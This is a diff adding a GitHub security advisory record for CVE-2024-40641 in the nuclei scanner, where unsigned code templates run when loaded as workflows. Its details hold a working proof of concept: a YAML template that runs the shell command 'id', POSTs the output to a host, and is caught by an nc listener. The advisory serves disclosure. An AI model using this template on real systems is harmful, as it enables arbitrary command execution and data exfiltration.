@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-c3q9-c27p-cw9h",
+  "modified": "2024-07-17T19:32:23Z",
+  "published": "2024-07-17T19:32:23Z",
+  "aliases": [
+    "CVE-2024-40641"
+  ],
+  "summary": "projectdiscovery/nuclei allows unsigned code template execution through workflows",
+  "details": "### Summary\nFind a way to execute code template without -code option and signature.\n\n### Details\nwrite a `code.yaml`:\n```yaml\nid: code\n\ninfo:\n  name: example code template\n  author: ovi3\n\n\ncode:\n  - engine:\n      - sh\n      - bash\n    source: |\n      id\n\nhttp:\n  - raw:\n      - |\n        POST /re HTTP/1.1\n        Host: {{Hostname}}\n\n        {{code_response}}\n\nworkflows:\n  - matchers:\n    - name: t\n```\n\nusing nc to listen on 80:\n```bash\nnc -lvvnp 80\n```\n\nexecute PoC template with nuclei:\n```bash\n./nuclei -disable-update-check  -w code.yaml -u http://127.0.0.1 -vv -debug\n```\nand nc will get `id` command output.\n\nWe use `-w` to specify a workflow file, not `-t` to template file. and notice there is a `workflows` field in code.yaml to pretend to be a workflow file.\n\nTest in Linux and Nuclei v3.2.9\n\n### Impact\nSome web applications inherit from Nuclei and allow users to edit and execute workflow files. In this case, users can execute arbitrary commands. (Although, as far as I know, most web applications use -t to execute)\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N"
+    },
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/projectdiscovery/nuclei/v3"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.3.0"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/projectdiscovery/nuclei/security/advisories/GHSA-c3q9-c27p-cw9h"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-40641"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/projectdiscovery/nuclei"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-07-17T19:32:23Z",
+    "nvd_published_at": "2024-07-17T18:15:05Z"
+  }
+}
